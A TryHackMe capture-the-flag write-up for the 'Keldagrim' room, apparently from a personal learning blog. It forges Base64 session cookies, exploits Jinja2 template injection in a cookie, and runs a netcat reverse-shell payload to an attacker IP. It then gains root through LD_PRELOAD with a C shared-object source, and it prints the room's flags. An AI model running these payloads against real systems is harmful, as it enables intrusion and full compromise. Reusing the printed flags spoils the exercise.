<h1 align="center">Keldagrim</h1>
<p align="center"><em>The dwarves are hiding their gold</em>!<br>
<img width="80px" src="https://github.com/user-attachments/assets/ab6bbba1-eb21-4189-8b67-d239ae0f6af0"><br>
July 13, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.
It´s part of my <code>433</code>-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>. It is classified as a medium-level CTF.
You can join it clicking  <a href="https://tryhackme.com/room/keldagrim">here</a>.<br><br>
<img width="1200px" src="https://github.com/user-attachments/assets/63b131be-0cb0-4167-a06d-7fc9dc6b0d08"></p>

<br>

<h2>Task 1 . Infiltrate the Forge</h2>
<p>Can you overcome the forge and steal all of the gold!</p>

<br>

<br>
<br>

Target = 10.10.64.159

<h1>Reconnaissance</h1>
<h3>Port Scanning with <code>nmap</code></h3>

```bash
:~/Keldagrim# nmap -sC -sV -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/3.0.6 Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.8.10
|     Date: Mon, xx Jul 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2634
|     Set-Cookie: session=WjNWbGMzUT0=; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title> Home page </title>
|     <link rel="stylesheet" href="/static/bootstrap.css">
|     <script src="/static/jquery-3.5.1.slim.min.js"></script>
|     <script src="/static/bootstrap.bundle.min.js"></script>
|     <link rel="stylesheet" href="/static/style.css">
|     </head>
|     <body>
|     <div class="jumbotron jumbotron-fluid mb-0 py-4">
|     <div class="container ">
|     class="display-4">Keldagrim Forge</h1>
|     class="lead">Welcome to Keldagrim Forge! The number one gold selling website!</p>
|     </div>
|     </div>
|     class="nav bg-light justify-content-center">
|     class="nav-item">
|     class="nav-link active" href="/">Home</a>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.8.10
|     Date: Mon, xx Jul 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
|_http-server-header: Werkzeug/3.0.6 Python/3.8.10
|_http-title:  Home page 
```

<h3>Web</code></h3>

<img width="1003" height="418" alt="image" src="https://github.com/user-attachments/assets/1fc27556-4f79-458a-a252-9f7f38a2da23" />

<h3>directory and file enumeration using <code>gobuster</code></h3>

<p>

- <code>/services</code><br>
- <code>/admin</code>, Status: 200<br>
- <code>/team</code><br>
- <code>/wow</code><br>
- <code>/runescape</code><br>
- <code>/...</code><br></p>

```bash
~/Keldagrim# gobuster dir -u http://keldagrim.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -x txt,php,js,back,old,html -t 80
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://keldagrim.thm/services             (Status: 500) [Size: 265]
http://keldagrim.thm/admin                (Status: 200) [Size: 2634]
http://keldagrim.thm/team                 (Status: 500) [Size: 265]
http://keldagrim.thm/wow                  (Status: 500) [Size: 265]
http://keldagrim.thm/runescape            (Status: 500) [Size: 265]
...
```

<p>
  
- WjNWbGMzUT0=<br>
- decoded from Base64 --> guest</p>
- admin encoded to Base64 --> YWRtaW4=<br>
- substituted the cookie value<br>
- navigated to <code>Buy Gold</code> > <code>Admin</code></p>

<img width="1044" height="327" alt="image" src="https://github.com/user-attachments/assets/042e0e07-6e10-4768-b2ba-57d850cac7a0" />

<img width="1099" height="123" alt="image" src="https://github.com/user-attachments/assets/c3cb6429-bfd4-412a-9659-e63a2300e1f0" />

<p>

- besides session cookie now there is <code>sales</code> cookie<br>
- SkRJc01UWTE decoded from Base64 is JDIsMTY1<br>
- decoded from Base64 once more it is <code>$2,165</code></p>

<img width="1103" height="99" alt="image" src="https://github.com/user-attachments/assets/17b9e361-86d8-49f1-914e-27a5d77f407e" />

<p>

- substituted sale´s cookie <code>SkRJc01UWTE</code> by <code>YWRtaW4=</code><br>
- Current user - <code>admin</code></p>

<img width="1100" height="122" alt="image" src="https://github.com/user-attachments/assets/cca66542-a1e6-4ffa-ad70-0b1ad17fcc3a" />

<p>

- substituted sale´s cookie <code>admin</code> by <code>rose</code><br>
- <code>YWRtaW4=</code> by <code>cm9zZQ==</code><br>
- Current user - <code>rose</code></p>

<img width="1101" height="147" alt="image" src="https://github.com/user-attachments/assets/8e678567-d8ee-449e-9052-fdcddf17dc4e" />



<h3>HackTricks</h3>
<p>https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection</p>

<img width="1329" height="452" alt="image" src="https://github.com/user-attachments/assets/31a7687c-6ff6-4db2-84b6-aa19f16153ed" />

<img width="1073" height="359" alt="image" src="https://github.com/user-attachments/assets/57301743-8c6e-4cf6-8519-ec01e445f2fd" />

<img width="1886" height="885" alt="image" src="https://github.com/user-attachments/assets/01c487a6-ebe2-46a1-89e9-48942bc35eb0" />

<p>

- substituted the previous sale´s cookie by {{7*7}}</code> which encoded to Base64 is<code>e3s3Kjd9fQ==</code><br>
- Current User - <code>49</code><br>
- it is about <code>SSTI</code>, Server-side Teamplate Injection</p>

<img width="1099" height="155" alt="image" src="https://github.com/user-attachments/assets/45333736-30a9-4c16-a9b7-f81a4fecbc7d" />


<h1>Weaponization</h1>

<p>

- substituted the previous sale´s cookie by <code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code> which encoded to Base64 is <code>e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscycpLnJlYWQoKX19</code><br>
- Current User - <code>Current user - app.py basic.py buy.py __pycache__ static templates venv </code></p>

<img width="1096" height="148" alt="image" src="https://github.com/user-attachments/assets/8b4c3059-1f8c-49fd-be57-f63392d4daab" />

<p>
  
- substituted the previous sale´s cookie by <code>{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}</code> which encoded to Base64 is <code>e3sgZ2V0X2ZsYXNoZWRfbWVzc2FnZXMuX19nbG9iYWxzX18uX19idWlsdGluc19fLm9wZW4oIi9ldGMvcGFzc3dkIikucmVhZCgpIH19</code></p>

<img width="1157" height="167" alt="image" src="https://github.com/user-attachments/assets/3a747b2c-f35d-4fed-8469-14a55b5ad9ae" />

<p>
  
- substituted the previous sale´s cookie by <code>{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}</code> which encoded to Base64 is <code>e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscyAtbGEnKS5yZWFkKCl9fQ==</code></p>

<img width="1164" height="262" alt="image" src="https://github.com/user-attachments/assets/f0664f96-bf80-4336-bb99-f80e6e02cf98" />


```bash
{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.144.180 4444 >/tmp/f').read()}}

```

```bash
e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfHNoIC1pIDI+JjF8bmMgMTAuMTAuMTQ0LjE4MCA0NDQ0ID4vdG1wL2YnKS5yZWFkKCl9fQ0K
```


<h3>listener</h3>

```bash
:~/Keldagrim# nc -nlvp 4444
```

<h3>shell</h3>

```bash
:~/Keldagrim# nc -nlvp 4444
...
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
jed@ip-10-10-64-159:~/app$ ^Z
jed@ip-10-10-64-159:~/app$ cat /home/jed/user.txt
cat /home/jed/user.txt
thm{d55ac4d0a728741d7b8c23b999e73cf3}
```

```bash
jed@ip-10-10-64-159:~/app$ find / -perm /4000 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/fusermount
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/snapd/23771/usr/lib/snapd/snap-confine
/snap/core20/2501/usr/bin/chfn
/snap/core20/2501/usr/bin/chsh
/snap/core20/2501/usr/bin/gpasswd
/snap/core20/2501/usr/bin/mount
/snap/core20/2501/usr/bin/newgrp
/snap/core20/2501/usr/bin/passwd
/snap/core20/2501/usr/bin/su
/snap/core20/2501/usr/bin/sudo
/snap/core20/2501/usr/bin/umount
/snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2501/usr/lib/openssh/ssh-keysign
/snap/core20/2571/usr/bin/chfn
/snap/core20/2571/usr/bin/chsh
/snap/core20/2571/usr/bin/gpasswd
/snap/core20/2571/usr/bin/mount
/snap/core20/2571/usr/bin/newgrp
/snap/core20/2571/usr/bin/passwd
/snap/core20/2571/usr/bin/su
/snap/core20/2571/usr/bin/sudo
/snap/core20/2571/usr/bin/umount
/snap/core20/2571/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2571/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/authbind/helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
jed@ip-10-10-64-159:~/app$ 
```

<h3>sudo</h3>

```bash
jed@ip-10-10-64-159:~/app$ sudo -l
sudo -l
Matching Defaults entries for jed on ip-10-10-64-159:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on ip-10-10-64-159:
    (ALL : ALL) NOPASSWD: /bin/ps
```

<h3>shell.c</h3>

```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
```

```bash
~/Keldagrim# gcc -fPIC -shared -o shell.so shell.c -nostartfiles
:~/Keldagrim# ls
rev.py  shell.c  shell.so
```

```bash
~/Keldagrim# gcc -fPIC -shared -o shell.so shell.c -nostartfiles
:~/Keldagrim# ls
rev.py  shell.c  shell.so
```

```bash
jed@ip-10-10-64-159:~/app$ wget http:/AttackIP0:8000/shell.so
...

shell.so            100%[===================>]  14.41K  --.-KB/s    in 0s      

2025-07-14 02:30:23 (166 MB/s) - \u2018shell.so\u2019 saved [14760/14760]

jed@ip-10-10-64-159:~/app$ mv shell.so /tmp
jed@ip-10-10-64-159:~/app$ cd /tmp
jed@ip-10-10-64-159:/tmp$ ls
...
shell.so
...
```


```bash
jed@ip-10-10-64-159:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /bin/ps
root@ip-10-10-64-159:/tmp# cd /root
root@ip-10-10-64-159:~# cat /root/root.txt
thm{bf2a087f833b58df233c0f24eac3aec5}
```

<br>
<br>

<h1>Actions and Objectives</h1>
<p><em>Answer the questions below</em></p>

<p>1.1. user.txt<br>
<code>thm{d55ac4d0a728741d7b8c23b999e73cf3}</code></p>

<br>

<p>1.2.root.txt<br>
<code>thm{bf2a087f833b58df233c0f24eac3aec5}</code></p>

<br>

<h1 align="center">Room Completed</h1>
<br>
<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/cb0cf417-8562-4596-ba39-1d36cafdc1fc"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/9205864a-dc23-4c9a-b8aa-b1f9246abe6a"></p>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 13, 2025     | 433      |     160ᵗʰ    |      5ᵗʰ     |    182nd    |     8ᵗʰ    |  114,645 |    855    |     64    |

</div>



<img width="1903" height="886" alt="image" src="https://github.com/user-attachments/assets/68f8244c-53f7-4c92-9faf-a214030b5d8a" />

<img width="1892" height="887" alt="image" src="https://github.com/user-attachments/assets/29aeda96-7225-4d68-adaf-5b4fdc8b077d" />

<img width="1894" height="898" alt="image" src="https://github.com/user-attachments/assets/aabce5b2-8535-4a26-a6b0-3e856c4a9079" />

<img width="1895" height="894" alt="image" src="https://github.com/user-attachments/assets/955f9b7f-b79d-479b-9d34-9dbd162dd4ee" />
